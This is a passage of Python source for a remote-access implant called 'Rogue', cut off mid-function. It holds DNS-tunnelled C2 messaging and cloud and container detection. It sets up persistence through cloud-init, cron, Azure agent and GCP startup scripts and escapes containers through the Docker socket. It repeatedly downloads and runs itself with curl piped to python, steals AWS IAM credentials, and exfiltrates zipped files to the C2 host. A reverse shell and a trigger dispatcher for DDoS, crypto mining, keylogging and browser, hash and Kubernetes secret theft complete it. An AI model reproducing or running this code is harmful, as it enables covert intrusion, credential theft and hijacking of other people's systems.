    """Send a raw v2 frame over DNS as a sequence of TXT queries.

    The frame is base64url-encoded and split across multiple queries
    (each <= 50 chars per label so total qname stays well under the RFC 1035
    255-octet limit). Format per query:
        <rnd>.<chunk_index>.<chunk_total>.<b64chunk>.<zone>
    Intermediate queries are answered with "ack"; the final query carries the
    response (base64url, possibly multi-string TXT). Returns the decoded
    response bytes, or None on failure.
    """
    b64 = base64.urlsafe_b64encode(raw_wire).decode("ascii").rstrip("=")
    if len(b64) <= 50:
        chunks = [b64]
    else:
        chunks = [b64[i:i + 50] for i in range(0, len(b64), 50)]
    rnd = rv2_rand(4).hex()
    total = len(chunks)
    last_resp = None
    for i, chunk in enumerate(chunks):
        qname = "%s.%d.%d.%s.%s" % (rnd, i, total, chunk, zone)
        if len(qname) > 250:
            return None
        resp = rv2_dns_query_txt(qname, resolver_ip, resolver_port=resolver_port)
        if resp is None:
            return None  # ack/answer lost -> caller retries whole frame next cycle
        resp = resp.strip()
        if resp == "ack" or resp == "":
            continue
        last_resp = resp
    if not last_resp:
        return None
    try:
        b = last_resp.replace("-", "+").replace("_", "/")
        b += "=" * ((4 - len(b) % 4) % 4)
        return base64.b64decode(b)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Framing helper for stream transports (reverse shell etc.)
# ---------------------------------------------------------------------------
def rv2_frame_recv(sock, max_len=1 << 20):
    """Read one length-prefixed frame (4-byte BE header). Returns bytes or None on EOF."""
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    ln = struct.unpack(">I", hdr)[0]
    if ln > max_len:
        raise ValueError("frame too large")
    data = b""
    while len(data) < ln:
        chunk = sock.recv(min(65536, ln - len(data)))
        if not chunk:
            return None
        data += chunk
    return data


def rv2_frame_send(sock, payload):
    sock.sendall(struct.pack(">I", len(payload)) + payload)
# ===== END ROGUE-V2 COMMS CORE =====

# === CLOUD AWARE IMPLANT ===
class CloudAwareImplant:
    def __init__(self):
        self.cloud_info = None
        self.cloud_tactics = None
        
    def detect_environment(self):
        """Detect and adapt to cloud environment"""
        self.cloud_info = self._quick_cloud_detect()
        
        if self.cloud_info.get('is_cloud'):
            self.cloud_tactics = self._get_recommended_tactics()
            
            # Log cloud detection
            cloud_log = {
                'timestamp': time.time(),
                'cloud_info': self.cloud_info,
                'implant_id': IMPLANT_ID_HASH
            }
            
            cloud_log_path = os.path.join(HIDDEN_DIR, "cloud_detection.json")
            with open(cloud_log_path, 'w') as f:
                json.dump(cloud_log, f, indent=2)
        
        return self.cloud_info
    
    def _quick_cloud_detect(self):
        """Quick cloud detection without loading full detector"""
        detectors = [
            self._check_aws,
            self._check_azure,
            self._check_gcp,
            self._check_docker,
            self._check_kubernetes,
            self._check_container,
        ]
        
        for detector in detectors:
            result = detector()
            if result:
                return result
        
        return {'provider': 'unknown', 'is_cloud': False, 'type': 'baremetal'}
    
    def _check_aws(self):
        """Check for AWS"""
        try:
            # Try AWS metadata service
            req = Request("http://169.254.169.254/latest/meta-data/")
            req.add_header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
            
            # Try to get token for IMDSv2
            try:
                token_req = Request("http://169.254.169.254/latest/api/token")
                token_req.add_header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
                token_req.method = "PUT"
                token = urlopen(token_req, timeout=2).read().decode()
                req.add_header("X-aws-ec2-metadata-token", token)
            except:
                pass
            
            urlopen(req, timeout=2)
            return {'provider': 'aws', 'is_cloud': True, 'type': 'vm'}
        except:
            # Check system files
            if os.path.exists('/sys/hypervisor/uuid'):
                with open('/sys/hypervisor/uuid', 'r') as f:
                    if f.read().startswith('ec2'):
                        return {'provider': 'aws', 'is_cloud': True, 'type': 'vm'}
            
            aws_indicators = [
                '/sys/devices/virtual/dmi/id/product_name',
                '/sys/devices/virtual/dmi/id/bios_version',
                '/sys/class/dmi/id/chassis_vendor',
            ]
            
            for indicator in aws_indicators:
                if os.path.exists(indicator):
                    with open(indicator, 'r') as f:
                        if 'amazon' in f.read().lower():
                            return {'provider': 'aws', 'is_cloud': True, 'type': 'vm'}
        return None
    
    def _check_azure(self):
        """Check for Azure"""
        try:
            req = Request("http://169.254.169.254/metadata/instance?api-version=2021-02-01")
            req.add_header("Metadata", "true")
            urlopen(req, timeout=2)
            return {'provider': 'azure', 'is_cloud': True, 'type': 'vm'}
        except:
            # Check for Azure-specific files
            azure_indicators = [
                '/sys/class/dmi/id/chassis_asset_tag',
                '/sys/class/dmi/id/sys_vendor',
                '/var/lib/cloud/instance/datasource',
            ]
            
            for indicator in azure_indicators:
                if os.path.exists(indicator):
                    with open(indicator, 'r') as f:
                        content = f.read().lower()
                        if 'microsoft' in content or 'azure' in content or '7783-7084-3265-9085-8269-3286-77' in content:
                            return {'provider': 'azure', 'is_cloud': True, 'type': 'vm'}
        return None
    
    def _check_gcp(self):
        """Check for Google Cloud Platform"""
        try:
            req = Request("http://metadata.google.internal/computeMetadata/v1/")
            req.add_header("Metadata-Flavor", "Google")
            urlopen(req, timeout=2)
            return {'provider': 'gcp', 'is_cloud': True, 'type': 'vm'}
        except:
            # Check for GCP indicators
            gcp_indicators = [
                '/sys/class/dmi/id/product_name',
                '/sys/class/dmi/id/sys_vendor',
                '/var/lib/cloud/instance/datasource',
            ]
            
            for indicator in gcp_indicators:
                if os.path.exists(indicator):
                    with open(indicator, 'r') as f:
                        if 'google' in f.read().lower():
                            return {'provider': 'gcp', 'is_cloud': True, 'type': 'vm'}
        return None
    
    def _check_docker(self):
        """Check for Docker"""
        if os.path.exists('/.dockerenv'):
            return {'provider': 'docker', 'is_cloud': True, 'type': 'container'}
        
        if os.path.exists('/proc/1/cgroup'):
            with open('/proc/1/cgroup', 'r') as f:
                if 'docker' in f.read():
                    return {'provider': 'docker', 'is_cloud': True, 'type': 'container'}
        return None
    
    def _check_kubernetes(self):
        """Check for Kubernetes"""
        if os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount'):
            return {'provider': 'kubernetes', 'is_cloud': True, 'type': 'container'}
        
        env_vars = ['KUBERNETES_SERVICE_HOST', 'KUBERNETES_SERVICE_PORT']
        if any(var in os.environ for var in env_vars):
            return {'provider': 'kubernetes', 'is_cloud': True, 'type': 'container'}
        return None
    
    def _check_container(self):
        """Check for generic container"""
        if os.path.exists('/proc/1/cgroup'):
            with open('/proc/1/cgroup', 'r') as f:
                content = f.read()
                if any(indicator in content for indicator in ['containerd', 'crio', 'podman', 'kubepods']):
                    return {'provider': 'container', 'is_cloud': True, 'type': 'container'}
        return None
    
    def _get_recommended_tactics(self):
        """Get recommended tactics based on cloud environment"""
        tactics = {
            'persistence': [],
            'collection': [],
            'evasion': [],
            'payloads': [],
        }
        
        if not self.cloud_info:
            return tactics
        
        provider = self.cloud_info.get('provider')
        
        # Common cloud tactics
        tactics['persistence'].extend(['cloud_init_modification', 'cron_cloud_metadata'])
        tactics['collection'].extend(['cloud_metadata_collection', 'credential_harvesting'])
        tactics['evasion'].extend(['low_profile_beaconing', 'encrypted_storage'])
        
        # Provider-specific tactics
        if provider == 'aws':
            tactics['collection'].extend(['aws_credential_harvesting', 'aws_metadata_exfiltration'])
            tactics['payloads'].extend(['aws_credential_stealer.py', 's3_scanner.py'])
        
        elif provider == 'azure':
            tactics['collection'].extend(['azure_managed_identity_harvesting', 'azure_metadata_collection'])
            tactics['payloads'].extend(['azure_cred_harvester.py', 'key_vault_scanner.py'])
        
        elif provider == 'gcp':
            tactics['collection'].extend(['gcp_service_account_harvesting', 'gcp_metadata_collection'])
            tactics['payloads'].extend(['gcp_cred_harvester.py', 'gcp_bucket_scanner.py'])
        
        elif provider in ['docker', 'kubernetes', 'container']:
            tactics['persistence'].extend(['container_image_modification', 'kubernetes_cronjob'])
            tactics['collection'].extend(['container_breakout_attempt', 'kubernetes_secret_harvesting'])
            tactics['evasion'].extend(['container_fileless_execution', 'memory_only_persistence'])
            tactics['payloads'].extend(['container_escape.py', 'k8s_secret_stealer.py'])
        
        return tactics
    
    def adapt_hidden_dir(self):
        """Choose optimal hidden directory based on environment"""
        if not self.cloud_info or not self.cloud_info.get('is_cloud'):
            return HIDDEN_DIR
        
        provider = self.cloud_info.get('provider')
        
        if provider in ['docker', 'kubernetes', 'container']:
            # Containers: use ephemeral storage or bind mounts
            possible_locations = [
                '/tmp/.cache_systemd',
                '/dev/shm/.system_logs',
                '/run/.systemd',
                '/var/tmp/.log_cache',
            ]
        elif provider in ['aws', 'azure', 'gcp']:
            # Cloud VMs: use system directories that persist
            possible_locations = [
                '/var/lib/cloud/.cache',
                '/opt/.system_logs',
                '/usr/local/share/.cache',
                '/etc/.config_backup',
            ]
        else:
            return HIDDEN_DIR
        
        # Try locations
        for location in possible_locations:
            try:
                os.makedirs(location, exist_ok=True)
                # Test write
                test_file = os.path.join(location, '.test')
                with open(test_file, 'w') as f:
                    f.write('test')
                os.remove(test_file)
                return location
            except:
                continue
        
        return HIDDEN_DIR
    
    def adapt_persistence(self):
        """Adapt persistence mechanism for cloud"""
        if not self.cloud_info or not self.cloud_info.get('is_cloud'):
            return setup_persistence()  # Default
        
        provider = self.cloud_info.get('provider')
        
        if provider == 'aws':
            return self.setup_aws_persistence()
        elif provider == 'azure':
            return self.setup_azure_persistence()
        elif provider == 'gcp':
            return self.setup_gcp_persistence()
        elif provider in ['docker', 'kubernetes', 'container']:
            return self.setup_container_persistence()
        else:
            return setup_persistence()
    
    def setup_aws_persistence(self):
        """AWS-specific persistence"""
        print("[CLOUD] Setting up AWS-aware persistence")
        
        # 1. Cloud-init user-data modification
        cloud_init_paths = [
            '/etc/cloud/cloud.cfg',
            '/var/lib/cloud/instance/user-data.txt',
            '/var/lib/cloud/scripts/per-instance',
        ]
        
        for path in cloud_init_paths:
            if os.path.exists(path):
                try:
                    backup = f"{path}.backup"
                    shutil.copy(path, backup)
                    
                    with open(path, 'a') as f:
                        f.write(f"\n# AWS System Maintenance\n")
                        f.write(f"echo 'export ROGUE_LAUNCHED=1' >> /etc/profile\n")
                        f.write(f"(cd {HIDDEN_DIR} && nohup python3 rogue_implant.py >/dev/null 2>&1 &)\n")
                    
                    print(f"[+] Modified {path} for persistence")
                except Exception as e:
                    print(f"[-] Failed to modify {path}: {e}")
        
        # 2. Instance metadata cron job
        cron_cmd = f"0 * * * * root curl -s http://169.254.169.254/latest/meta-data/instance-id >/dev/null && cd {HIDDEN_DIR} && python3 rogue_implant.py &\n"
        
        cron_paths = ['/etc/cron.d/aws-monitor', '/etc/cron.hourly/aws-check']
        for path in cron_paths:
            try:
                with open(path, 'a') as f:
                    f.write(cron_cmd)
                print(f"[+] Added AWS cron persistence: {path}")
            except:
                pass
        
        return True
    
    def setup_azure_persistence(self):
        """Azure-specific persistence"""
        print("[CLOUD] Setting up Azure-aware persistence")
        
        # 1. Azure VM Agent extension
        waagent_dir = '/var/lib/waagent'
        if os.path.exists(waagent_dir):
            extension_dir = os.path.join(waagent_dir, 'custom-script')
            os.makedirs(extension_dir, exist_ok=True)
            
            extension_script = os.path.join(extension_dir, 'enable.sh')
            with open(extension_script, 'w') as f:
                f.write(f"""#!/bin/bash
# Azure Custom Script Extension
(cd {HIDDEN_DIR} && nohup python3 rogue_implant.py >/dev/null 2>&1 &)
""")
            os.chmod(extension_script, 0o755)
        
        # 2. cloud-init for Azure
        cloud_init_azure = '/etc/cloud/cloud.cfg.d/91-azure.cfg'
        os.makedirs(os.path.dirname(cloud_init_azure), exist_ok=True)
        
        with open(cloud_init_azure, 'a') as f:
            f.write(f"""
# Azure cloud-init extension
runcmd:
  - [bash, -c, "cd {HIDDEN_DIR} && nohup python3 rogue_implant.py >/dev/null 2>&1 &"]
""")
        
        return True
    
    def setup_gcp_persistence(self):
        """GCP-specific persistence"""
        print("[CLOUD] Setting up GCP-aware persistence")
        
        # 1. Google Cloud Startup Script
        startup_script = '/etc/google-cloud-startup-script'
        with open(startup_script, 'w') as f:
            f.write(f"""#!/bin/bash
# Google Cloud Startup Script
(cd {HIDDEN_DIR} && nohup python3 rogue_implant.py >/dev/null 2>&1 &)
""")
        os.chmod(startup_script, 0o755)
        
        # 2. cloud-init for GCP
        cloud_init_gcp = '/etc/cloud/cloud.cfg.d/90-gcp.cfg'
        os.makedirs(os.path.dirname(cloud_init_gcp), exist_ok=True)
        
        with open(cloud_init_gcp, 'a') as f:
            f.write(f"""
# GCP cloud-init configuration
bootcmd:
  - [bash, -c, "cd {HIDDEN_DIR} && python3 rogue_implant.py &"]
""")
        
        return True
    
    def setup_container_persistence(self):
        """Container-specific persistence"""
        print("[CLOUD] Setting up container-aware persistence")
        
        # 1. Docker socket access (if available)
        docker_socket = '/var/run/docker.sock'
        if os.path.exists(docker_socket):
            print("[+] Docker socket found - setting up container escape persistence")
            
            escape_script = os.path.join(HIDDEN_DIR, 'docker_escape.sh')
            with open(escape_script, 'w') as f:
                f.write(f"""#!/bin/bash
# Docker container escape persistence
DOCKER_HOST=unix:///var/run/docker.sock
# Mount host filesystem and install implant
docker run --rm -v /:/host alpine sh -c "
    cp {HIDDEN_DIR}/rogue_implant.py /host/tmp/ &&
    echo 'nohup python3 /tmp/rogue_implant.py &' >> /host/etc/profile
"
""")
            os.chmod(escape_script, 0o755)
        
        # 2. Memory-only persistence for containers
        mem_script = os.path.join(HIDDEN_DIR, 'memory_persistence.sh')
        with open(mem_script, 'w') as f:
            f.write(f"""#!/bin/bash
# Memory-only persistence for containers
IMPLANT_URL="{PAYLOAD_REPO}rogue_implant.py"

while true; do
    # Download implant to memory and execute
    curl -s $IMPLANT_URL | python3 -
    sleep 300
done
""")
        os.chmod(mem_script, 0o755)
        
        # Run memory persistence in background
        subprocess.Popen(['nohup', 'bash', mem_script, '&'], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        return True
    
    def fetch_cloud_payloads(self):
        """Fetch cloud-specific payloads"""
        if not self.cloud_info or not self.cloud_tactics:
            return []
        
        payloads = self.cloud_tactics.get('payloads', [])
        fetched = []
        
        for payload in payloads:
            if fetch_payload(payload):
                fetched.append(payload)
        
        if fetched:
            print(f"[CLOUD] Fetched {len(fetched)} cloud-specific payloads: {fetched}")
        
        return fetched
    
    def execute_cloud_recon(self):
        """Execute cloud-specific reconnaissance"""
        if not self.cloud_info or not self.cloud_info.get('is_cloud'):
            return "No cloud environment detected"
        
        provider = self.cloud_info.get('provider')
        results = []
        
        results.append(f"=== CLOUD RECONNAISSANCE: {provider.upper()} ===")
        results.append(f"\n[Cloud Environment]")
        results.append(f"Provider: {provider}")
        results.append(f"Type: {self.cloud_info.get('type', 'unknown')}")
        
        # Provider-specific recon
        if provider == 'aws':
            results.append(self.aws_recon())
        elif provider == 'azure':
            results.append(self.azure_recon())
        elif provider == 'gcp':
            results.append(self.gcp_recon())
        elif provider in ['docker', 'kubernetes', 'container']:
            results.append(self.container_recon())
        
        return "\n".join(results)
    
    def aws_recon(self):
        """AWS-specific reconnaissance"""
        results = []
        
        try:
            # Try to get AWS metadata
            endpoints = [
                ('Instance ID', 'instance-id'),
                ('Instance Type', 'instance-type'),
                ('Region', 'placement/availability-zone'),
                ('Public IP', 'public-ipv4'),
            ]
            
            for name, endpoint in endpoints:
                try:
                    req = Request(f"http://169.254.169.254/latest/meta-data/{endpoint}")
                    data = urlopen(req, timeout=2).read().decode()
                    results.append(f"{name}: {data}")
                except:
                    results.append(f"{name}: Not available")
            
            # Try to get IAM role
            try:
                req = Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
                role = urlopen(req, timeout=2).read().decode().strip()
                
                if role:
                    results.append(f"IAM Role: {role}")
                    cred_req = Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
                    cred_data = json.loads(urlopen(cred_req, timeout=2).read().decode())
                    results.append(f"Access Key: {cred_data.get('AccessKeyId')}")
                    results.append(f"Secret Key: {cred_data.get('SecretAccessKey')[:20]}...")
            except:
                pass
            
        except Exception as e:
            results.append(f"[!] AWS recon failed: {e}")
        
        return "\n".join(results)
    
    def azure_recon(self):
        """Azure-specific reconnaissance"""
        results = []
        
        try:
            # Get Azure metadata
            req = Request("http://169.254.169.254/metadata/instance?api-version=2021-02-01")
            req.add_header("Metadata", "true")
            
            response = urlopen(req, timeout=2)
            data = json.loads(response.read().decode())
            
            results.append("[Azure Metadata]")
            if 'compute' in data:
                compute = data['compute']
                results.append(f"VM ID: {compute.get('vmId')}")
                results.append(f"VM Size: {compute.get('vmSize')}")
                results.append(f"Location: {compute.get('location')}")
                results.append(f"Resource Group: {compute.get('resourceGroupName')}")
            
        except Exception as e:
            results.append(f"[!] Azure recon failed: {e}")
        
        return "\n".join(results)
    
    def gcp_recon(self):
        """GCP-specific reconnaissance"""
        results = []
        
        try:
            # Get GCP metadata
            endpoints = [
                ('Instance ID', 'instance/id'),
                ('Machine Type', 'instance/machine-type'),
                ('Zone', 'instance/zone'),
                ('Project ID', 'project/project-id'),
            ]
            
            results.append("[GCP Metadata]")
            for name, endpoint in endpoints:
                try:
                    req = Request(f"http://metadata.google.internal/computeMetadata/v1/{endpoint}")
                    req.add_header("Metadata-Flavor", "Google")
                    data = urlopen(req, timeout=2).read().decode()
                    results.append(f"{name}: {data}")
                except:
                    results.append(f"{name}: Not available")
            
        except Exception as e:
            results.append(f"[!] GCP recon failed: {e}")
        
        return "\n".join(results)
    
    def container_recon(self):
        """Container-specific reconnaissance"""
        results = []
        
        results.append("[Container Environment]")
        
        # Check Docker
        if os.path.exists('/.dockerenv'):
            results.append("Running in Docker container")
        
        # Check cgroups
        if os.path.exists('/proc/1/cgroup'):
            with open('/proc/1/cgroup', 'r') as f:
                results.append("\n[cgroups]")
                results.append(f.read()[:500] + "..." if len(f.read()) > 500 else f.read())
        
        # Check for Kubernetes
        if os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount'):
            results.append("\n[Kubernetes Environment]")
            try:
                with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
                    results.append(f"Namespace: {f.read().strip()}")
            except:
                pass
        
        return "\n".join(results)

# Initialize cloud awareness
cloud_implant = CloudAwareImplant()

# === ENHANCED SILENT MODE ===
def should_run_silently():
    """Check if we should run in silent mode - ONLY from persistence"""
    if os.environ.get('ROGUE_LAUNCHED') == '1':
        return True
    try:
        ppid = os.getppid()
        with open(f'/proc/{ppid}/cmdline', 'rb') as f:
            cmdline = f.read().decode('utf-8', errors='ignore').lower()
            if 'bash' in cmdline and ('rc' in cmdline or 'profile' in cmdline):
                return True
    except:
        pass
    return False

def redirect_output_to_log():
    """Redirect all output to log file for silent operation"""
    log_file = os.path.join(HIDDEN_DIR, ".implant.log")
    try:
        log_fd = open(log_file, 'a')
        sys.stdout = log_fd
        sys.stderr = log_fd
        return True
    except Exception as e:
        return False

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def send_https_command(cmd):
    """Send command over HTTPS to C2 - WITH DEBUG OUTPUT"""
    if V2_ENABLED:
        return send_https_command_v2(cmd)
    url = f"https://{C2_HOST}/"
    encrypted_cmd = encrypt_response(cmd)
    
    try:
        req = urllib.request.Request(
            url,
            data=encrypted_cmd,
            headers={
                'Content-Type': 'application/octet-stream',
                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                'X-Implant-ID': IMPLANT_ID_HASH
            },
            method='POST'
        )
        
        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
        encrypted_response = response.read()
        decrypted_response = decrypt_command(encrypted_response)
        return decrypted_response
    except Exception as e:
        error_msg = f"[!] Connection failed: {type(e).__name__}"
        if hasattr(e, 'reason'):
            error_msg += f" - {e.reason}"
        print(f"[DEBUG] Connection error: {e}")
        return error_msg

def fetch_payload(name):
    """Fetch payload from C2 server - WITH DEBUG"""
    url = f"{PAYLOAD_REPO}{name}"
    dest = os.path.join(HIDDEN_DIR, name)
    
    try:
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                'X-Implant-ID': IMPLANT_ID_HASH
            }
        )
        
        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
        
        with open(dest, 'wb') as f:
            f.write(response.read())
        
        if name.endswith('.py'):
            os.chmod(dest, 0o755)
        
        print(f"[+] Fetched payload: {name}")
        return dest
        
    except Exception as e:
        print(f"[!] Failed to fetch {name}: {e}")
        return None

def run_payload(name):
    path = os.path.join(HIDDEN_DIR, name)
    if os.path.exists(path):
        print(f"[+] Running payload: {name}")
        return subprocess.getoutput(f"python3 {path}")
    return f"[!] Payload {name} not found."

# === KUBERNETES SECRET STEALER HELPER FUNCTIONS ===

def trigger_k8s_steal():
    """Wrapper function for Rogue implant integration"""
    print("[+] Starting Kubernetes secret stealer...")
    
    # Download the payload if not present
    payload_path = fetch_payload("k8s_secret_stealer.py")
    if not payload_path:
        return "[!] Failed to download k8s_secret_stealer.py"
    
    # Run the payload
    try:
        result = subprocess.run(
            ["python3", payload_path, "--dump-all"],
            capture_output=True,
            text=True,
            timeout=300  # 5 minutes timeout
        )
        
        if result.returncode == 0:
            output = result.stdout
            
            # Extract output directory from results
            dir_match = re.search(r"Output directory: (.*?)\n", output)
            if dir_match:
                output_dir = dir_match.group(1)
                
                # Create summary
                summary = f"[+] Kubernetes secret stealing completed\n"
                summary += f"[+] Output directory: {output_dir}\n"
                
                # Count files
                file_count = 0
                for root, dirs, files in os.walk(output_dir):
                    file_count += len(files)
                
                summary += f"[+] Total files extracted: {file_count}\n"
                
                # Look for interesting files
                interesting_paths = [
                    os.path.join(output_dir, "tokens"),
                    os.path.join(output_dir, "certificates"),
                    os.path.join(output_dir, "ssh_keys"),
                ]
                
                for path in interesting_paths:
                    if os.path.exists(path):
                        count = len(os.listdir(path))
                        summary += f"[+] Found {count} items in {os.path.basename(path)}\n"
                
                return summary + "\n" + output[-1000:]  # Last 1000 chars of output
            else:
                return output[-2000:]  # Last 2000 chars if can't parse
        
        else:
            return f"[!] Kubernetes secret stealer failed:\n{result.stderr}"
    
    except subprocess.TimeoutExpired:
        return "[!] Kubernetes secret stealer timed out (5 minutes)"
    except Exception as e:
        return f"[!] Error running Kubernetes secret stealer: {e}"

def trigger_k8s_targeted(namespace=None, secret=None):
    """Targeted Kubernetes secret stealing"""
    if not namespace:
        return "[!] Usage: trigger_k8s_targeted <namespace> [secret_name]"
    
    print(f"[+] Starting targeted Kubernetes secret stealer for namespace: {namespace}")
    
    payload_path = fetch_payload("k8s_secret_stealer.py")
    if not payload_path:
        return "[!] Failed to download k8s_secret_stealer.py"
    
    try:
        cmd = ["python3", payload_path, "--target-namespace", namespace]
        if secret:
            cmd.extend(["--target-secret", secret])
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=120  # 2 minutes timeout
        )
        
        if result.returncode == 0:
            return f"[+] Targeted Kubernetes secret stealing completed\n{result.stdout[-1000:]}"
        else:
            return f"[!] Targeted stealing failed:\n{result.stderr}"
    
    except Exception as e:
        return f"[!] Error: {e}"

def zip_directory(path, zipf=None, base=""):
    if zipf is None:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
        should_close = True
    else:
        should_close = False

    if os.path.isdir(path):
        for root, _, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.join(base, os.path.relpath(full_path, path))
                zipf.write(full_path, arcname)
    elif os.path.isfile(path):
        zipf.write(path, arcname=os.path.join(base, os.path.basename(path)))

    if should_close:
        zipf.close()
        return zip_path

def encrypt_file(path):
    with open(path, 'rb') as f:
        plaintext = f.read()
    cipher = AES.new(EXFIL_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext

def exfiltrate_data(path):
    try:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            if isinstance(path, list):
                for p in path:
                    zip_directory(p, zipf, base=os.path.basename(p))
            else:
                zip_directory(path, zipf)
        if V2_ENABLED:
            raw_zip = open(zip_path, "rb").read()
            encrypted_blob = rv2i_exfil_seal(raw_zip) or encrypt_file(zip_path)
        else:
            encrypted_blob = encrypt_file(zip_path)
        os.remove(zip_path)

        s = socket.socket()
        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
        s.connect((host, EXFIL_PORT))
        s.sendall(encrypted_blob)
        s.close()
        print(f"[+] Exfiltration successful: {path}")
        return f"[+] Exfiltrated encrypted archive from: {path}"
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")
        return f"[!] Exfiltration failed: {e}"

def reverse_shell():
    try:
        s = socket.socket()
        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
        s.connect((host, 9001))
        while True:
            s.send(b"$ ")
            cmd = s.recv(1024).decode()
            if cmd.strip().lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
        s.close()
    except Exception as e:
        print(f"[!] Reverse shell failed: {e}")

def handle_trigger(cmd):
    # === CLOUD-AWARE TRIGGERS ===
    if cmd == "trigger_cloud_detect":
        """Detect cloud environment (full scan)"""
        fetch_payload("cloud_detector.py")
        return run_payload("cloud_detector.py")

    elif cmd == "trigger_cloud_recon":
        """Execute cloud reconnaissance"""
        return cloud_implant.execute_cloud_recon()

    elif cmd == "trigger_aws_creds":
        """AWS credential harvesting"""
        fetch_payload("aws_credential_stealer.py")
        return run_payload("aws_credential_stealer.py")

    elif cmd == "trigger_azure_creds":
        """Azure credential harvesting"""
        fetch_payload("azure_cred_harvester.py")
        return run_payload("azure_cred_harvester.py")

    elif cmd == "trigger_gcp_creds":
        """GCP credential harvesting"""
        fetch_payload("gcp_cred_harvester.py")
        return run_payload("gcp_cred_harvester.py")

    elif cmd == "trigger_container_escape":
        """Container escape attempt"""
        fetch_payload("container_escape.py")
        return run_payload("container_escape.py")

    elif cmd == "trigger_k8s_creds":
        """Kubernetes credential harvesting - Enhanced version"""
        return trigger_k8s_steal()

    elif cmd == "trigger_k8s_steal":
        """Kubernetes secret stealing (alias)"""
        return trigger_k8s_steal()
    
    elif cmd.startswith("trigger_k8s_target"):
        """Targeted Kubernetes secret stealing"""
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: trigger_k8s_target <namespace> [secret_name]"
        
        namespace = parts[1]
        secret = parts[2] if len(parts) > 2 else None
        
        return trigger_k8s_targeted(namespace, secret)

    # === EXISTING TRIGGERS ===
    elif cmd.startswith("trigger_ddos"):
        fetch_payload("ddos.py")
        path = os.path.join(HIDDEN_DIR, "ddos.py")
        args = " ".join(cmd.split()[1:])
        if os.path.exists(path):
            print(f"[+] Starting DDoS attack with args: {args}")
            return subprocess.getoutput(f"python3 {path} {args}")
        return "[!] ddos.py not found after download"

    elif cmd == "trigger_mine":
        fetch_payload("mine.py")
        print("[+] Starting crypto miner")
        return run_payload("mine.py")

    elif cmd == "trigger_stopmine":
        print("[+] Stopping crypto miner")
        return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")

    elif cmd.startswith("trigger_exfil"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: trigger_exfil <path>"
        path = parts[1]
        print(f"[+] Starting exfiltration of: {path}")
        return exfiltrate_data(path)

    elif cmd == "trigger_dumpcreds":
        targets = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/.ssh"),
        ]
        existing_targets = [t for t in targets if os.path.exists(t)]
        if existing_targets:
            print(f"[+] Dumping credentials from {len(existing_targets)} locations")
            return exfiltrate_data(existing_targets)
        return "[!] No target directories found"

    elif cmd == "trigger_stealthinject":
        path = os.path.join(HIDDEN_DIR, "polyloader.py")
        if not os.path.exists(path):
            fetch_payload("polyloader.py")
        if os.path.exists(path):
            print("[+] Executing polyloader.py")
            return subprocess.getoutput(f"python3 {path}")
        return "[!] polyloader.py not found"

    # === NEW TRIGGERS FOR ENHANCED PAYLOAD SUITE ===
    
    elif cmd == "trigger_sysrecon":
        """Execute system reconnaissance"""
        fetch_payload("sysrecon.py")
        print("[+] Starting system reconnaissance")
        return run_payload("sysrecon.py")

    elif cmd == "trigger_linpeas":
        """Execute Linux privilege escalation check"""
        fetch_payload("linpeas_light.py")
        print("[+] Starting LinPEAS privilege escalation check")
        return run_payload("linpeas_light.py")

    elif cmd == "trigger_hashdump":
        """Dump password hashes"""
        fetch_payload("hashdump.py")
        print("[+] Starting password hash extraction")
        return run_payload("hashdump.py")

    elif cmd == "trigger_browsersteal":
        """Steal browser credentials and data"""
        fetch_payload("browserstealer.py")
        print("[+] Starting browser data extraction")
        return run_payload("browserstealer.py")

    elif cmd.startswith("trigger_keylogger"):
        """Start/stop keystroke logging"""
        parts = cmd.split()
        if len(parts) > 1 and parts[1] == "stop":
            print("[+] Stopping keylogger")
            return subprocess.getoutput("pgrep -f keylogger.py && pkill -f keylogger.py || echo '[-] No keylogger running.'")
        else:
            fetch_payload("keylogger.py")
            print("[+] Starting keystroke logger")
            # Start in background thread
            threading.Thread(target=lambda: run_payload("keylogger.py")).start()
            return "[*] Keylogger started in background"

    elif cmd.startswith("trigger_screenshot"):
